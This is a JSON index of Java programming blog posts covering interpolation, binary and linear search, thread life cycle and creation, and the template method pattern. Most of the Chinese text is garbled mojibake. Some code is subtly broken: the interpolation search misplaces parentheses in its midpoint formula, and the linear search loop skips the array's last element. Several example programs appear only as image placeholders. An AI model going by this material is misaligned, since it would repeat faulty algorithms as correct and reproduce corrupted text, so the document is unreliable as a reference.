‡å‡†åº“æ”¯æŒçš„æ‰€æœ‰å“ˆå¸Œç®—æ³•å¯ä»¥åœ¨è¿™é‡ŒæŸ¥åˆ°ã€‚","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"interpolation-search-algorithm","slug":"æ’å€¼æŸ¥æ‰¾ç®—æ³•","date":"2020-06-16T17:18:21.000Z","updated":"2021-04-11T17:11:28.890Z","comments":true,"path":"æ’å€¼æŸ¥æ‰¾ç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/%E6%8F%92%E5%80%BC%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/","excerpt":"æ’å€¼æŸ¥æ‰¾ç®—æ³•","text":"æ’å€¼æŸ¥æ‰¾ç®—æ³• /** * @Author: Wizard * @Date: 2020/6/17 9:06 */ public class insertSearch { /** * @param arr æ•°ç»„ * @param left å·¦è¾¹çš„ç´¢å¼• * @param right å³è¾¹çš„ç´¢å¼• * @param findVal è¦æŸ¥æ‰¾çš„å€¼ * @return */ public static int insertValue(int[] arr, int left, int right, int findVal) { System.out.println(&quot;æ’å€¼æŸ¥æ‰¾æ¬¡æ•°...&quot;); //æ³¨æ„ï¼šfindVal&lt;arr[0]å’ŒfindVal&gt;arr[arr.length-1]å¿…é¡»éœ€è¦ //å¦åˆ™å¾—åˆ°çš„midå¯èƒ½è¶Šç•Œ if (left &gt; right || findVal &lt; arr[0] || findVal &gt; arr[arr.length - 1]) { return -1; } //æ±‚å‡ºmid,è‡ªé€‚åº” int mid = left + (right - left) * (findVal - arr[left] / arr[right] - arr[left]); int midVal = arr[mid]; if (findVal &gt; midVal) { //åº”è¯¥å‘å³é€’å½’ return insertValue(arr, mid + 1, right, findVal); } else if (findVal &lt; midVal) { return insertValue(arr, left, mid - 1, findVal); } else { return mid; } } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"binary-search-algorithm","slug":"äºŒåˆ†æŸ¥æ‰¾ç®—æ³•","date":"2020-06-16T17:04:50.000Z","updated":"2021-04-11T17:11:28.567Z","comments":true,"path":"äºŒåˆ†æŸ¥æ‰¾ç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/","excerpt":"äºŒåˆ†æŸ¥æ‰¾ç®—æ³•","text":"äºŒåˆ†æŸ¥æ‰¾ç®—æ³• /** * äºŒåˆ†æŸ¥æ‰¾ç®—æ³• * * @param arr å¾…æŸ¥æ‰¾çš„æ•°ç»„,arræ˜¯å‡åºæ’åº * @param target éœ€è¦æŸ¥æ‰¾çš„æ•° * @return è¿”å›å¯¹åº”çš„ä¸‹æ ‡ï¼Œ-1è¡¨ç¤ºæ²¡æœ‰ */ public static int binarySearch(int[] arr, int target) { int left = 0; int right = arr.length - 1; while (left &lt;= right) { //è¯´æ˜å¯ä»¥ç»§ç»­æŸ¥æ‰¾ int mid = (left + right) / 2; if (arr[mid] == target) { return mid; } else if (arr[mid] &gt; target) { right = mid - 1;//éœ€è¦å‘å·¦è¾¹æŸ¥æ‰¾ } else { left = mid + 1;//éœ€è¦å‘å³è¾¹æŸ¥æ‰¾ } } return -1; }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"linear-search-algorithm","slug":"çº¿æ€§æŸ¥æ‰¾ç®—æ³•","date":"2020-06-16T16:54:06.000Z","updated":"2021-04-11T17:11:28.986Z","comments":true,"path":"çº¿æ€§æŸ¥æ‰¾ç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/%E7%BA%BF%E6%80%A7%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/","excerpt":"çº¿æ€§æŸ¥æ‰¾ç®—æ³•","text":"çº¿æ€§æŸ¥æ‰¾ç®—æ³• æœ‰ä¸€ä¸ªæ•°åˆ—ï¼š {1,8, 10, 89, 1000, 1234} ï¼Œåˆ¤æ–­æ•°åˆ—ä¸­æ˜¯å¦åŒ…å«æ­¤åç§° ã€é¡ºåºæŸ¥æ‰¾ã€‘ è¦æ±‚: å¦‚æœæ‰¾åˆ°äº†ï¼Œå°±æç¤ºæ‰¾åˆ°ï¼Œå¹¶ç»™å‡ºä¸‹æ ‡å€¼ã€‚ /** * @Author: Wizard * @Date: 2020/6/17 8:57 */ public class OrderSearch { public static void main(String[] args) { int[] arr = {1, 8, 10, 89, 1000, 1234}; System.out.println(OrderFind(arr, 10)); } public static int OrderFind(int[] arr, int value) { for (int i = 0; i &lt; arr.length - 1; i++) { if (arr[i] == value) { return i; } } return -1; } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"å¤šçº¿ç¨‹","slug":"å¤šçº¿ç¨‹","date":"2020-06-14T17:13:04.000Z","updated":"2021-04-11T17:11:28.845Z","comments":true,"path":"å¤šçº¿ç¨‹/","link":"","permalink":"https://blog.kayleh.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"å¤šçº¿ç¨‹","text":"å¤šçº¿ç¨‹ ä¸€ä¸ªçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸçº¿ç¨‹æ˜¯ä¸€ä¸ªåŠ¨æ€æ‰§è¡Œçš„è¿‡ç¨‹ï¼Œå®ƒä¹Ÿæœ‰ä¸€ä¸ªä»äº§ç”Ÿåˆ°æ­»äº¡çš„è¿‡ç¨‹ã€‚ ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªçº¿ç¨‹å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸã€‚ img æ–°å»ºçŠ¶æ€: ä½¿ç”¨ new å…³é”®å­—å’Œ Thread ç±»æˆ–å…¶å­ç±»å»ºç«‹ä¸€ä¸ªçº¿ç¨‹å¯¹è±¡åï¼Œè¯¥çº¿ç¨‹å¯¹è±¡å°±å¤„äºæ–°å»ºçŠ¶æ€ã€‚å®ƒä¿æŒè¿™ä¸ªçŠ¶æ€ç›´åˆ°ç¨‹åº start() è¿™ä¸ªçº¿ç¨‹ã€‚ å°±ç»ªçŠ¶æ€: å½“çº¿ç¨‹å¯¹è±¡è°ƒç”¨äº†start()æ–¹æ³•ä¹‹åï¼Œè¯¥çº¿ç¨‹å°±è¿›å…¥å°±ç»ªçŠ¶æ€ã€‚å°±ç»ªçŠ¶æ€çš„çº¿ç¨‹å¤„äºå°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œè¦ç­‰å¾…JVMé‡Œçº¿ç¨‹è°ƒåº¦å™¨çš„è°ƒåº¦ã€‚ è¿è¡ŒçŠ¶æ€: å¦‚æœå°±ç»ªçŠ¶æ€çš„çº¿ç¨‹è·å– CPU èµ„æºï¼Œå°±å¯ä»¥æ‰§è¡Œ run()ï¼Œæ­¤æ—¶çº¿ç¨‹ä¾¿å¤„äºè¿è¡ŒçŠ¶æ€ã€‚å¤„äºè¿è¡ŒçŠ¶æ€çš„çº¿ç¨‹æœ€ä¸ºå¤æ‚ï¼Œå®ƒå¯ä»¥å˜ä¸ºé˜»å¡çŠ¶æ€ã€å°±ç»ªçŠ¶æ€å’Œæ­»äº¡çŠ¶æ€ã€‚ é˜»å¡çŠ¶æ€: å¦‚æœä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œäº†sleepï¼ˆç¡çœ ï¼‰ã€suspendï¼ˆæŒ‚èµ·ï¼‰ç­‰æ–¹æ³•ï¼Œå¤±å»æ‰€å ç”¨èµ„æºä¹‹åï¼Œè¯¥çº¿ç¨‹å°±ä»è¿è¡ŒçŠ¶æ€è¿›å…¥é˜»å¡çŠ¶æ€ã€‚åœ¨ç¡çœ æ—¶é—´å·²åˆ°æˆ–è·å¾—è®¾å¤‡èµ„æºåå¯ä»¥é‡æ–°è¿›å…¥å°±ç»ªçŠ¶æ€ã€‚å¯ä»¥åˆ†ä¸ºä¸‰ç§ï¼š ç­‰å¾…é˜»å¡ï¼šè¿è¡ŒçŠ¶æ€ä¸­çš„çº¿ç¨‹æ‰§è¡Œ wait() æ–¹æ³•ï¼Œä½¿çº¿ç¨‹è¿›å…¥åˆ°ç­‰å¾…é˜»å¡çŠ¶æ€ã€‚ åŒæ­¥é˜»å¡ï¼šçº¿ç¨‹åœ¨è·å– synchronized åŒæ­¥é”å¤±è´¥(å› ä¸ºåŒæ­¥é”è¢«å…¶ä»–çº¿ç¨‹å ç”¨)ã€‚ å…¶ä»–é˜»å¡ï¼šé€šè¿‡è°ƒç”¨çº¿ç¨‹çš„ sleep() æˆ– join() å‘å‡ºäº† I/O è¯·æ±‚æ—¶ï¼Œçº¿ç¨‹å°±ä¼šè¿›å…¥åˆ°é˜»å¡çŠ¶æ€ã€‚å½“sleep() çŠ¶æ€è¶…æ—¶ï¼Œjoin() ç­‰å¾…çº¿ç¨‹ç»ˆæ­¢æˆ–è¶…æ—¶ï¼Œæˆ–è€… I/O å¤„ç†å®Œæ¯•ï¼Œçº¿ç¨‹é‡æ–°è½¬å…¥å°±ç»ªçŠ¶æ€ã€‚ æ­»äº¡çŠ¶æ€: ä¸€ä¸ªè¿è¡ŒçŠ¶æ€çš„çº¿ç¨‹å®Œæˆä»»åŠ¡æˆ–è€…å…¶ä»–ç»ˆæ­¢æ¡ä»¶å‘ç”Ÿæ—¶ï¼Œè¯¥çº¿ç¨‹å°±åˆ‡æ¢åˆ°ç»ˆæ­¢çŠ¶æ€ã€‚ çº¿ç¨‹çš„ä¼˜å…ˆçº§æ¯ä¸€ä¸ª Java çº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªä¼˜å…ˆçº§ï¼Œè¿™æ ·æœ‰åŠ©äºæ“ä½œç³»ç»Ÿç¡®å®šçº¿ç¨‹çš„è°ƒåº¦é¡ºåºã€‚ Java çº¿ç¨‹çš„ä¼˜å…ˆçº§æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå…¶å–å€¼èŒƒå›´æ˜¯ 1 ï¼ˆThread.MIN_PRIORITY ï¼‰ - 10 ï¼ˆThread.MAX_PRIORITY ï¼‰ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ä¼šåˆ†é…ä¸€ä¸ªä¼˜å…ˆçº§ NORM_PRIORITYï¼ˆ5ï¼‰ã€‚ å…·æœ‰è¾ƒé«˜ä¼˜å…ˆçº§çš„çº¿ç¨‹å¯¹ç¨‹åºæ›´é‡è¦ï¼Œå¹¶ä¸”åº”è¯¥åœ¨ä½ä¼˜å…ˆçº§çš„çº¿ç¨‹ä¹‹å‰åˆ†é…å¤„ç†å™¨èµ„æºã€‚ä½†æ˜¯ï¼Œçº¿ç¨‹ä¼˜å…ˆçº§ä¸èƒ½ä¿è¯çº¿ç¨‹æ‰§è¡Œçš„é¡ºåºï¼Œè€Œä¸”éå¸¸ä¾èµ–äºå¹³å°ã€‚ åˆ›å»ºä¸€ä¸ªçº¿ç¨‹Java æä¾›äº†ä¸‰ç§åˆ›å»ºçº¿ç¨‹çš„æ–¹æ³•ï¼š é€šè¿‡å®ç° Runnable æ¥å£ï¼› é€šè¿‡ç»§æ‰¿ Thread ç±»æœ¬èº«ï¼› é€šè¿‡ Callable å’Œ Future åˆ›å»ºçº¿ç¨‹ã€‚ é€šè¿‡å®ç° Runnable æ¥å£æ¥åˆ›å»ºçº¿ç¨‹åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªå®ç° Runnable æ¥å£çš„ç±»ã€‚ ä¸ºäº†å®ç° Runnableï¼Œä¸€ä¸ªç±»åªéœ€è¦æ‰§è¡Œä¸€ä¸ªæ–¹æ³•è°ƒç”¨ run()ï¼Œå£°æ˜å¦‚ä¸‹ï¼š public void run() ä½ å¯ä»¥é‡å†™è¯¥æ–¹æ³•ï¼Œé‡è¦çš„æ˜¯ç†è§£çš„ run() å¯ä»¥è°ƒç”¨å…¶ä»–æ–¹æ³•ï¼Œä½¿ç”¨å…¶ä»–ç±»ï¼Œå¹¶å£°æ˜å˜é‡ï¼Œå°±åƒä¸»çº¿ç¨‹ä¸€æ ·ã€‚ åœ¨åˆ›å»ºä¸€ä¸ªå®ç° Runnable æ¥å£çš„ç±»ä¹‹åï¼Œä½ å¯ä»¥åœ¨ç±»ä¸­å®ä¾‹åŒ–ä¸€ä¸ªçº¿ç¨‹å¯¹è±¡ã€‚ Thread å®šä¹‰äº†å‡ ä¸ªæ„é€ æ–¹æ³•ï¼Œä¸‹é¢çš„è¿™ä¸ªæ˜¯æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„ï¼š Thread(Runnable threadOb,String threadName); è¿™é‡Œï¼ŒthreadOb æ˜¯ä¸€ä¸ªå®ç° Runnable æ¥å£çš„ç±»çš„å®ä¾‹ï¼Œå¹¶ä¸” threadName æŒ‡å®šæ–°çº¿ç¨‹çš„åå­—ã€‚ æ–°çº¿ç¨‹åˆ›å»ºä¹‹åï¼Œä½ è°ƒç”¨å®ƒçš„ start() æ–¹æ³•å®ƒæ‰ä¼šè¿è¡Œã€‚ void start(); ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ›å»ºçº¿ç¨‹å¹¶å¼€å§‹è®©å®ƒæ‰§è¡Œçš„å®ä¾‹ï¼š img ç¼–è¯‘ä»¥ä¸Šç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹ï¼š Creating Thread-1 Starting Thread-1 Creating Thread-2 Starting Thread-2 Running Thread-1 Thread: Thread-1, 4 Running Thread-2 Thread: Thread-2, 4 Thread: Thread-1, 3 Thread: Thread-2, 3 Thread: Thread-1, 2 Thread: Thread-2, 2 Thread: Thread-1, 1 Thread: Thread-2, 1 Thread Thread-1 exiting. Thread Thread-2 exiting. é€šè¿‡ç»§æ‰¿Threadæ¥åˆ›å»ºçº¿ç¨‹åˆ›å»ºä¸€ä¸ªçº¿ç¨‹çš„ç¬¬äºŒç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œè¯¥ç±»ç»§æ‰¿ Thread ç±»ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹ã€‚ ç»§æ‰¿ç±»å¿…é¡»é‡å†™ run() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯æ–°çº¿ç¨‹çš„å…¥å£ç‚¹ã€‚å®ƒä¹Ÿå¿…é¡»è°ƒç”¨ start() æ–¹æ³•æ‰èƒ½æ‰§è¡Œã€‚ è¯¥æ–¹æ³•å°½ç®¡è¢«åˆ—ä¸ºä¸€ç§å¤šçº¿ç¨‹å®ç°æ–¹å¼ï¼Œä½†æ˜¯æœ¬è´¨ä¸Šä¹Ÿæ˜¯å®ç°äº† Runnable æ¥å£çš„ä¸€ä¸ªå®ä¾‹ã€‚ ç¼–è¯‘ä»¥ä¸Šç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹ï¼š Creating Thread-1 Starting Thread-1 Creating Thread-2 Starting Thread-2 Running Thread-1 Thread: Thread-1, 4 Running Thread-2 Thread: Thread-2, 4 Thread: Thread-1, 3 Thread: Thread-2, 3 Thread: Thread-1, 2 Thread: Thread-2, 2 Thread: Thread-1, 1 Thread: Thread-2, 1 Thread Thread-1 exiting. Thread Thread-2 exiting. Thread æ–¹æ³•ä¸‹è¡¨åˆ—å‡ºäº†Threadç±»çš„ä¸€äº›é‡è¦æ–¹æ³•ï¼š åºå· æ–¹æ³•æè¿° 1 public void start() ä½¿è¯¥çº¿ç¨‹å¼€å§‹æ‰§è¡Œï¼›Java è™šæ‹Ÿæœºè°ƒç”¨è¯¥çº¿ç¨‹çš„ run æ–¹æ³•ã€‚ 2 public void run() å¦‚æœè¯¥çº¿ç¨‹æ˜¯ä½¿ç”¨ç‹¬ç«‹çš„ Runnable è¿è¡Œå¯¹è±¡æ„é€ çš„ï¼Œåˆ™è°ƒç”¨è¯¥ Runnable å¯¹è±¡çš„ run æ–¹æ³•ï¼›å¦åˆ™ï¼Œè¯¥æ–¹æ³•ä¸æ‰§è¡Œä»»ä½•æ“ä½œå¹¶è¿”å›ã€‚ 3 public final void setName(String name) æ”¹å˜çº¿ç¨‹åç§°ï¼Œä½¿ä¹‹ä¸å‚æ•° name ç›¸åŒã€‚ 4 public final void setPriority(int priority) æ›´æ”¹çº¿ç¨‹çš„ä¼˜å…ˆçº§ã€‚ 5 public final void setDaemon(boolean on) å°†è¯¥çº¿ç¨‹æ ‡è®°ä¸ºå®ˆæŠ¤çº¿ç¨‹æˆ–ç”¨æˆ·çº¿ç¨‹ã€‚ 6 public final void join(long millisec) ç­‰å¾…è¯¥çº¿ç¨‹ç»ˆæ­¢çš„æ—¶é—´æœ€é•¿ä¸º millis æ¯«ç§’ã€‚ 7 public void interrupt() ä¸­æ–­çº¿ç¨‹ã€‚ 8 public final boolean isAlive() æµ‹è¯•çº¿ç¨‹æ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚ æµ‹è¯•çº¿ç¨‹æ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚ ä¸Šè¿°æ–¹æ³•æ˜¯è¢«Threadå¯¹è±¡è°ƒç”¨çš„ã€‚ä¸‹é¢çš„æ–¹æ³•æ˜¯Threadç±»çš„é™æ€æ–¹æ³•ã€‚ åºå· æ–¹æ³•æè¿° 1 public static void yield() æš‚åœå½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œå…¶ä»–çº¿ç¨‹ã€‚ 2 public static void sleep(long millisec) åœ¨æŒ‡å®šçš„æ¯«ç§’æ•°å†…è®©å½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ä¼‘çœ ï¼ˆæš‚åœæ‰§è¡Œï¼‰ï¼Œæ­¤æ“ä½œå—åˆ°ç³»ç»Ÿè®¡æ—¶å™¨å’Œè°ƒåº¦ç¨‹åºç²¾åº¦å’Œå‡†ç¡®æ€§çš„å½±å“ã€‚ 3 public static boolean holdsLock(Object x) å½“ä¸”ä»…å½“å½“å‰çº¿ç¨‹åœ¨æŒ‡å®šçš„å¯¹è±¡ä¸Šä¿æŒç›‘è§†å™¨é”æ—¶ï¼Œæ‰è¿”å› trueã€‚ 4 public static Thread currentThread() è¿”å›å¯¹å½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ 5 public static void dumpStack() å°†å½“å‰çº¿ç¨‹çš„å †æ ˆè·Ÿè¸ªæ‰“å°è‡³æ ‡å‡†é”™è¯¯æµã€‚ å®ä¾‹å¦‚ä¸‹çš„ThreadClassDemo ç¨‹åºæ¼”ç¤ºäº†Threadç±»çš„ä¸€äº›æ–¹æ³•ï¼š è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œæ¯ä¸€æ¬¡è¿è¡Œçš„ç»“æœéƒ½ä¸ä¸€æ ·ã€‚ Starting hello thread... Starting goodbye thread... Hello Hello Hello Hello Hello Hello Goodbye Goodbye Goodbye Goodbye Goodbye ....... é€šè¿‡ Callable å’Œ Future åˆ›å»ºçº¿ç¨‹ åˆ›å»º Callable æ¥å£çš„å®ç°ç±»ï¼Œå¹¶å®ç° call() æ–¹æ³•ï¼Œè¯¥ call() æ–¹æ³•å°†ä½œä¸ºçº¿ç¨‹æ‰§è¡Œä½“ï¼Œå¹¶ä¸”æœ‰è¿”å›å€¼ã€‚ åˆ›å»º Callable å®ç°ç±»çš„å®ä¾‹ï¼Œä½¿ç”¨ FutureTask ç±»æ¥åŒ…è£… Callable å¯¹è±¡ï¼Œè¯¥ FutureTask å¯¹è±¡å°è£…äº†è¯¥ Callable å¯¹è±¡çš„ call() æ–¹æ³•çš„è¿”å›å€¼ã€‚ ä½¿ç”¨ FutureTask å¯¹è±¡ä½œä¸º Thread å¯¹è±¡çš„ target åˆ›å»ºå¹¶å¯åŠ¨æ–°çº¿ç¨‹ã€‚ è°ƒç”¨ FutureTask å¯¹è±¡çš„ get() æ–¹æ³•æ¥è·å¾—å­çº¿ç¨‹æ‰§è¡Œç»“æŸåçš„è¿”å›å€¼ã€‚ åˆ›å»ºçº¿ç¨‹çš„ä¸‰ç§æ–¹å¼çš„å¯¹æ¯” é‡‡ç”¨å®ç° Runnableã€Callable æ¥å£çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹æ—¶ï¼Œçº¿ç¨‹ç±»åªæ˜¯å®ç°äº† Runnable æ¥å£æˆ– Callable æ¥å£ï¼Œè¿˜å¯ä»¥ç»§æ‰¿å…¶ä»–ç±»ã€‚ ä½¿ç”¨ç»§æ‰¿ Thread ç±»çš„æ–¹å¼åˆ›å»ºå¤šçº¿ç¨‹æ—¶ï¼Œç¼–å†™ç®€å•ï¼Œå¦‚æœéœ€è¦è®¿é—®å½“å‰çº¿ç¨‹ï¼Œåˆ™æ— éœ€ä½¿ç”¨ Thread.currentThread() æ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨ this å³å¯è·å¾—å½“å‰çº¿ç¨‹ã€‚ å¤šçº¿ç¨‹çš„ä½¿ç”¨æœ‰æ•ˆåˆ©ç”¨å¤šçº¿ç¨‹çš„å…³é”®æ˜¯ç†è§£ç¨‹åºæ˜¯å¹¶å‘æ‰§è¡Œè€Œä¸æ˜¯ä¸²è¡Œæ‰§è¡Œçš„ã€‚ä¾‹å¦‚ï¼šç¨‹åºä¸­æœ‰ä¸¤ä¸ªå­ç³»ç»Ÿéœ€è¦å¹¶å‘æ‰§è¡Œï¼Œè¿™æ—¶å€™å°±éœ€è¦åˆ©ç”¨å¤šçº¿ç¨‹ç¼–ç¨‹ã€‚ é€šè¿‡å¯¹å¤šçº¿ç¨‹çš„ä½¿ç”¨ï¼Œå¯ä»¥ç¼–å†™å‡ºéå¸¸é«˜æ•ˆçš„ç¨‹åºã€‚ä¸è¿‡è¯·æ³¨æ„ï¼Œå¦‚æœä½ åˆ›å»ºå¤ªå¤šçš„çº¿ç¨‹ï¼Œç¨‹åºæ‰§è¡Œçš„æ•ˆç‡å®é™…ä¸Šæ˜¯é™ä½äº†ï¼Œè€Œä¸æ˜¯æå‡äº†ã€‚ è¯·è®°ä½ï¼Œä¸Šä¸‹æ–‡çš„åˆ‡æ¢å¼€é”€ä¹Ÿå¾ˆé‡è¦ï¼Œå¦‚æœä½ åˆ›å»ºäº†å¤ªå¤šçš„çº¿ç¨‹ï¼ŒCPU èŠ±è´¹åœ¨ä¸Šä¸‹æ–‡çš„åˆ‡æ¢çš„æ—¶é—´å°†å¤šäºæ‰§è¡Œç¨‹åºçš„æ—¶é—´ï¼","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://blog.kayleh.top/tags/Concurrency/"}]},{"title":"æ¨¡æ¿æ–¹æ³•","slug":"æ¨¡æ¿æ–¹æ³•","date":"2020-06-13T01:22:53.000Z","updated":"2021-04-11T17:11:28.933Z","comments":true,"path":"æ¨¡æ¿æ–¹æ³•/","link":"","permalink":"https://blog.kayleh.top/%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95/","excerpt":"æ¨¡æ¿æ–¹æ³• å®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•çš„éª¨æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ï¼Œä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜ä¸€ä¸ªç®—æ³•çš„ç»“æ„å³å¯é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚","text":"æ¨¡æ¿æ–¹æ³• å®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•çš„éª¨æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ï¼Œä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜ä¸€ä¸ªç®—æ³•çš„ç»“æ„å³å¯é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚ åœ¨æ¨¡æ¿æ¨¡å¼ï¼ˆTemplate Patternï¼‰ä¸­ï¼Œä¸€ä¸ªæŠ½è±¡ç±»å…¬å¼€å®šä¹‰äº†æ‰§è¡Œå®ƒçš„æ–¹æ³•çš„æ–¹å¼/æ¨¡æ¿ã€‚å®ƒçš„å­ç±»å¯ä»¥æŒ‰éœ€è¦é‡å†™æ–¹æ³•å®ç°ï¼Œä½†è°ƒç”¨å°†ä»¥æŠ½è±¡ç±»ä¸­å®šä¹‰çš„æ–¹å¼è¿›è¡Œã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚ ä»‹ç»æ„å›¾ï¼šå®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•çš„éª¨æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ã€‚æ¨¡æ¿æ–¹æ³•ä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜ä¸€ä¸ªç®—æ³•çš„ç»“æ„å³å¯é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤ã€‚ ä¸»è¦è§£å†³ï¼šä¸€äº›æ–¹æ³•é€šç”¨ï¼Œå´åœ¨æ¯ä¸€ä¸ªå­ç±»éƒ½é‡æ–°å†™äº†è¿™ä¸€æ–¹æ³•ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šæœ‰ä¸€äº›é€šç”¨çš„æ–¹æ³•ã€‚ å¦‚ä½•è§£å†³ï¼šå°†è¿™äº›é€šç”¨ç®—æ³•æŠ½è±¡å‡ºæ¥ã€‚ å…³é”®ä»£ç ï¼šåœ¨æŠ½è±¡ç±»å®ç°ï¼Œå…¶ä»–æ­¥éª¤åœ¨å­ç±»å®ç°ã€‚ åº”ç”¨å®ä¾‹ï¼š 1ã€åœ¨é€ æˆ¿å­çš„æ—¶å€™ï¼Œåœ°åŸºã€èµ°çº¿ã€æ°´ç®¡éƒ½ä¸€æ ·ï¼Œåªæœ‰åœ¨å»ºç­‘çš„åæœŸæ‰æœ‰åŠ å£æ©±åŠ æ …æ ç­‰å·®å¼‚ã€‚ 2ã€è¥¿æ¸¸è®°é‡Œé¢è©è¨å®šå¥½çš„ 81 éš¾ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªé¡¶å±‚çš„é€»è¾‘éª¨æ¶ã€‚ 3ã€spring ä¸­å¯¹ Hibernate çš„æ”¯æŒï¼Œå°†ä¸€äº›å·²ç»å®šå¥½çš„æ–¹æ³•å°è£…èµ·æ¥ï¼Œæ¯”å¦‚å¼€å¯äº‹åŠ¡ã€è·å– Sessionã€å…³é—­ Session ç­‰ï¼Œç¨‹åºå‘˜ä¸é‡å¤å†™é‚£äº›å·²ç»è§„èŒƒå¥½çš„ä»£ç ï¼Œç›´æ¥ä¸¢ä¸€ä¸ªå®ä½“å°±å¯ä»¥ä¿å­˜ã€‚ ä¼˜ç‚¹ï¼š 1ã€å°è£…ä¸å˜éƒ¨åˆ†ï¼Œæ‰©å±•å¯å˜éƒ¨åˆ†ã€‚ 2ã€æå–å…¬å…±ä»£ç ï¼Œä¾¿äºç»´æŠ¤ã€‚ 3ã€è¡Œä¸ºç”±çˆ¶ç±»æ§åˆ¶ï¼Œå­ç±»å®ç°ã€‚ ç¼ºç‚¹ï¼šæ¯ä¸€ä¸ªä¸åŒçš„å®ç°éƒ½éœ€è¦ä¸€ä¸ªå­ç±»æ¥å®ç°ï¼Œå¯¼è‡´ç±»çš„ä¸ªæ•°å¢åŠ ï¼Œä½¿å¾—ç³»ç»Ÿæ›´åŠ åºå¤§ã€‚ ä½¿ç”¨åœºæ™¯ï¼š 1ã€æœ‰å¤šä¸ªå­ç±»å…±æœ‰çš„æ–¹æ³•ï¼Œä¸”é€»è¾‘ç›¸åŒã€‚ 2ã€é‡è¦çš„ã€å¤æ‚çš„æ–¹æ³•ï¼Œå¯ä»¥è€ƒè™‘ä½œä¸ºæ¨¡æ¿æ–¹æ³•ã€‚ æ³¨æ„äº‹é¡¹ï¼šä¸ºé˜²æ­¢æ¶æ„æ“ä½œï¼Œä¸€èˆ¬æ¨¡æ¿æ–¹æ³•éƒ½åŠ ä¸Š final å…³é”®è¯ã€‚ å®ç°æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªå®šä¹‰æ“ä½œçš„ Game æŠ½è±¡ç±»ï¼Œå…¶ä¸­ï¼Œæ¨¡æ¿æ–¹æ³•è®¾ç½®ä¸º finalï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢«é‡å†™ã€‚Cricket å’Œ Football æ˜¯æ‰©å±•äº† Game çš„å®ä½“ç±»ï¼Œå®ƒä»¬é‡å†™äº†æŠ½è±¡ç±»çš„æ–¹æ³•ã€‚ TemplatePatternDemoï¼Œæˆ‘ä»¬çš„æ¼”ç¤ºç±»ä½¿ç”¨ Game æ¥æ¼”ç¤ºæ¨¡æ¿æ¨¡å¼çš„ç”¨æ³•ã€‚ æ¨¡æ¿æ¨¡å¼çš„ UML å›¾ 